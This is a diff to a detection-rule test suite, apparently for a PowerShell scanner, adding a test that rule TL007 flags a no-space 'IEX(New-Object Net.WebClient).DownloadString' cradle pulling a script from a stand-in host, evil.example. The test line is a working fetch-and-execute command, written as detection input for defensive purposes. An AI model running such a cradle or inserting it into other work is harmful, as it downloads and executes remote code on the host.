@@ -38,6 +38,15 @@ def test_download_cradle_rule_matches_downloadfile_variant():
     assert [m.rule_id for m in matches] == ["TL007"]
 
 
+def test_download_cradle_rule_matches_no_space_iex_obfuscation():
+    # "IEX(New-Object ...)" with no space is a common obfuscation of the
+    # classic cradle; the WebClient patterns don't depend on an IEX prefix.
+    matches = rules.match_rules(
+        ["IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"]
+    )
+    assert [m.rule_id for m in matches] == ["TL007"]
+
+
 def test_download_cradle_rule_does_not_flag_standalone_encoded_command():
     # -EncodedCommand alone is a standard PowerShell flag used in benign CI/CD,
     # DSC, and Packer automation; TL004 already covers encoded execution.
